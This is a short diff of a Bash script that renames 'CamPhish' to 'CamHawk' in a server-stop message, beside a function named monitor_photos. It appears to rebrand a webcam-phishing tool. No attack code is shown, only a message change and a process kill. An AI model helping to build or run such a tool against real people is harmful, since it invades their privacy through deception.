@@ -102,7 +102,7 @@ monitor_photos() {
 
 # Stop the Server
 stop_server() {
-    echo -e "${YELLOW}[+] Stopping CamPhish server...${RESET}"
+    echo -e "${YELLOW}[+] Stopping CamHawk server...${RESET}"
     if [[ ! -z "$SERVER_PID" ]]; then
         kill $SERVER_PID 2>/dev/null
         echo -e "${GREEN}[+] Server stopped!${RESET}"
